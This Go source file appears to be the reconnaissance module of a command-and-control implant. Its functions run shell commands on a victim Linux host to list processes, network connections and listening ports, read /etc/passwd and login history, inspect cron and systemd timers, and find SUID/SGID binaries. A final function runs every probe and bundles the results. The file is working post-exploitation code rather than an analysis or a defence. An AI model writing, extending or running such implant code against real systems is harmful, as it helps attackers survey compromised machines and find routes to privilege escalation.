package module

import (
	"fmt"
	"strings"
	"time"

	"github.com/natx6/ananse/src/c2/implant/shell"
)

const cmdTimeout = 30 * time.Second

// run wraps shell.Run with the standard timeout.
func run(cmd string) (string, error) {
	return shell.Run(cmd, cmdTimeout)
}

// ---------------------------------------------------------------------------
// Process reconnaissance
// ---------------------------------------------------------------------------

// RunReconProcesses lists running processes.
func RunReconProcesses(_ map[string]interface{}) (string, error) {
	return run("ps aux --forest 2>/dev/null || ps aux 2>/dev/null")
}

// RunReconNetwork lists listening ports and active connections.
func RunReconNetwork(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"ss -tuln 2>/dev/null",
		"ss -tupn 2>/dev/null",
		"cat /proc/net/tcp /proc/net/udp 2>/dev/null",
	}
	return run(strings.Join(cmds, "; echo '---'; "))
}

// RunReconUsers lists user accounts and active sessions.
func RunReconUsers(_ map[string]interface{}) (string, error) {
	cmd := "cat /etc/passwd 2>/dev/null; echo '---LOGIN---'; w 2>/dev/null; echo '---LAST---'; last -20 2>/dev/null || lastlog -u 0 2>/dev/null"
	return run(cmd)
}

// RunReconCron inspects scheduled jobs.
func RunReconCron(_ map[string]interface{}) (string, error) {
	cmd := "ls -la /etc/cron* 2>/dev/null; echo '---CRONTAB---'; crontab -l 2>/dev/null; echo '---SYSTEMD---'; systemctl list-timers --all 2>/dev/null | head -50"
	return run(cmd)
}

// RunReconSuid finds SUID/SGID binaries.
func RunReconSuid(_ map[string]interface{}) (string, error) {
	return run("find /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f \\( -perm -4000 -o -perm -2000 \\) 2>/dev/null; find /etc -type f -perm -4000 2>/dev/null")
}

// RunReconAll runs all recon probes.
func RunReconAll(_ map[string]interface{}) (string, error) {
	var parts []string
	probes := []struct {
		name string
		fn   func(map[string]interface{}) (string, error)
	}{
		{"PROCESSES", RunReconProcesses},
		{"NETWORK", RunReconNetwork},
		{"USERS", RunReconUsers},
		{"CRON", RunReconCron},
		{"SUID", RunReconSuid},
	}
	for _, p := range probes {
		out, err := p.fn(nil)
		if err != nil {
			parts = append(parts, fmt.Sprintf("=== %s ===\nERROR: %v", p.name, err))
		} else {
			parts = append(parts, fmt.Sprintf("=== %s ===\n%s", p.name, out))
		}
	}
	return strings.Join(parts, "\n\n"), nil
}
